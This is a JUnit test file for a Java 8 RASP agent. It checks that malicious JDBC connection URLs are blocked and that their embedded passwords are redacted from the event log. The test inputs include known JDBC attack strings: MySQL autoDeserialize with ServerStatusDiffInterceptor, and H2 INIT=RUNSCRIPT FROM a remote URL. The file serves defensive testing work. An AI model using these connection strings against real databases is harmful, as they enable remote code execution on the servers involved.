package io.ohmyrasp.agent.java8;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * A URL in an event's detail reaches the spool without its credentials, on every backport line, as on the primary
 * (OhMyRaspHooksUrlCredentialsTest there): a JDBC URL a pool configured, with the password in its user information and
 * its parameters. The MySQL rule names the driver, host and options instead of the URL.
 */
final class Java8UrlCredentialsTest {
  private static final String SENTINEL = "Sentinel-Pw-9";

  @TempDir Path dir;
  private Path log;

  @BeforeEach
  void blockMode() {
    log = dir.resolve("events.jsonl");
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");
  }

  @AfterEach
  void restore() {
    System.clearProperty("ohmyrasp.java8.log");
    System.clearProperty("ohmyrasp.java8.block");
  }

  @Test
  void aConfiguredJdbcUrlNeverWritesItsPassword() throws Exception {
    assertThrows(Java8RaspBlockException.class, () -> Java8RaspHooks.beforeJdbcConnection(
        "jdbc:mysql://reporter:" + SENTINEL + "@db.internal:3306/app?password=" + SENTINEL
            + "&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"));
    assertThrows(Java8RaspBlockException.class, () -> Java8RaspHooks.beforeJdbcConnection(
        "jdbc:h2:mem:reports;PASSWORD=" + SENTINEL + ";INIT=RUNSCRIPT FROM 'http://127.0.0.1:1/init.sql'"));
    // Connector/J's address form carries the credentials as keys of the host.
    assertThrows(Java8RaspBlockException.class, () -> Java8RaspHooks.beforeJdbcConnection(
        "jdbc:mysql://address=(host=db2.internal)(port=3307)(user=reporter-" + SENTINEL + ")(password=" + SENTINEL
            + ")(autoDeserialize=true)/app?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"));

    String spooled = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(spooled.contains("\"jdbc_options\":\"driver=mysql host=db2.internal:3307 "
        + "options=autoDeserialize+ServerStatusDiffInterceptor\""), spooled);
    assertTrue(spooled.contains("\"jdbc_options\":\"driver=mysql host=db.internal:3306 "
        + "options=autoDeserialize+ServerStatusDiffInterceptor\""), spooled);
    assertTrue(spooled.contains("java8_jdbc_h2_code_execution"), spooled);
    assertTrue(spooled.contains("RUNSCRIPT FROM 'http://127.0.0.1:1/init.sql'"), "the evidence stays: " + spooled);
    assertFalse(spooled.contains(SENTINEL), spooled);
  }

  /** autoDeserialize beside a pool's own interceptor is not the exploit, as on the primary. */
  @Test
  void aPoolsOwnInterceptorBesideAutoDeserializeIsNotReported() throws Exception {
    Java8RaspHooks.beforeJdbcConnection(
        "jdbc:mysql://db.internal:3306/app?autoDeserialize=true&queryInterceptors=com.example.TracingInterceptor");
    assertFalse(Files.exists(log) && new String(Files.readAllBytes(log), StandardCharsets.UTF_8)
        .contains("jdbc_mysql_deserialization"));
  }

  /**
   * On a request with a body the JDBC URL, with its credentials and those of the URL inside it, is an operand the
   * event withholds whole; the event names the body field whose value the operand holds, as on the primary
   * (OhMyRaspHooksUrlCredentialsTest). The host of the script URL came from the request body.
   */
  @Test
  void aUrlWithCredentialsOnARequestWithABodyIsWithheldWholeAndTheMatchedFieldIsNamed() throws Exception {
    for (int i = 0; i < 1024; i++) Java8RaspHooks.afterHttpRequest();
    io.ohmyrasp.agent.http.RequestBodyCapture.dispatchExited(true);
    String host = "10.20.30.40";
    final byte[] body = ("{\"host\":\"" + host + "\"}").getBytes(StandardCharsets.UTF_8);
    Java8RaspHooks.beforeHttpRequest(new Java8RequestBodyTest.BodyRequest("/app/ping", "application/json", body.length));
    try {
      Object stream = new Object();
      Java8RaspHooks.exitBodyRead(body.length, Java8RaspHooks.enterBodyRead(stream), body, 0);
      final String jdbc = "jdbc:h2:mem:reports;PASSWORD=" + SENTINEL + ";INIT=RUNSCRIPT FROM 'http://loader:" + SENTINEL
          + "@" + host + "/init.sql'";
      assertThrows(Java8RaspBlockException.class, () -> Java8RaspHooks.beforeJdbcConnection(jdbc));
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }
    String spooled = Files.exists(log) ? new String(Files.readAllBytes(log), StandardCharsets.UTF_8) : "";
    // The JDBC URL is an operand: withheld whole, credentials and all; the event names the body field it matched.
    assertTrue(spooled.contains("\"operand\":\"jdbc_url, "), spooled);
    assertTrue(spooled.contains("\"input_field\":\"host\",\"input_value\":\"" + host + "\""), spooled);
    assertFalse(spooled.contains("RUNSCRIPT"), spooled);
    assertFalse(spooled.contains(SENTINEL), spooled);
  }

  /**
   * A body field that is itself a URL with a credential, used whole in the operand: the field is matched against
   * the operand as the application built it, and the value shown has its credential removed. Removing the
   * credentials from the operand first left nothing for the field to match, and the event named no input.
   */
  @Test
  void aBodyFieldThatIsAUrlWithACredentialIsNamedAndShownWithoutIt() throws Exception {
    for (int i = 0; i < 1024; i++) Java8RaspHooks.afterHttpRequest();
    io.ohmyrasp.agent.http.RequestBodyCapture.dispatchExited(true);
    String script = "http://10.20.30.40/init.sql?token=" + SENTINEL;
    final byte[] body = ("{\"script\":\"" + script + "\"}").getBytes(StandardCharsets.UTF_8);
    Java8RaspHooks.beforeHttpRequest(new Java8RequestBodyTest.BodyRequest("/app/ping", "application/json", body.length));
    try {
      Java8RaspHooks.exitBodyRead(body.length, Java8RaspHooks.enterBodyRead(new Object()), body, 0);
      final String jdbc = "jdbc:h2:mem:reports;INIT=RUNSCRIPT FROM '" + script + "'";
      assertThrows(Java8RaspBlockException.class, () -> Java8RaspHooks.beforeJdbcConnection(jdbc));
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }
    String spooled = Files.exists(log) ? new String(Files.readAllBytes(log), StandardCharsets.UTF_8) : "";
    assertTrue(spooled.contains("\"input_field\":\"script\",\"input_value\":\"http://10.20.30.40/init.sql?token=[redacted]\""),
        spooled);
    assertFalse(spooled.contains(SENTINEL), spooled);
  }

  /**
   * A body value equal to a credential's name ("password") inside the JDBC URL that carries that credential: on a
   * request with a body the detail is replaced by the allow-list, so neither the event nor the block carries the
   * password, as on the primary.
   */
  @Test
  void aBodyValueThatIsACredentialsNameDoesNotHideTheCredential() throws Exception {
    for (int i = 0; i < 1024; i++) Java8RaspHooks.afterHttpRequest();
    io.ohmyrasp.agent.http.RequestBodyCapture.dispatchExited(true);
    final byte[] body = "{\"field\":\"password\"}".getBytes(StandardCharsets.UTF_8);
    Java8RaspHooks.beforeHttpRequest(new Java8RequestBodyTest.BodyRequest("/app/ping", "application/json", body.length));
    try {
      Java8RaspHooks.exitBodyRead(body.length, Java8RaspHooks.enterBodyRead(new Object()), body, 0);
      final String jdbc = "jdbc:h2:mem:reports;password=" + SENTINEL
          + ";INIT=RUNSCRIPT FROM 'http://127.0.0.1:1/init.sql'";
      assertThrows(Java8RaspBlockException.class, () -> Java8RaspHooks.beforeJdbcConnection(jdbc));
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }
    String spooled = Files.exists(log) ? new String(Files.readAllBytes(log), StandardCharsets.UTF_8) : "";
    assertTrue(spooled.contains("java8_jdbc_h2_code_execution"), spooled);
    assertFalse(spooled.contains(SENTINEL), spooled);
  }
}
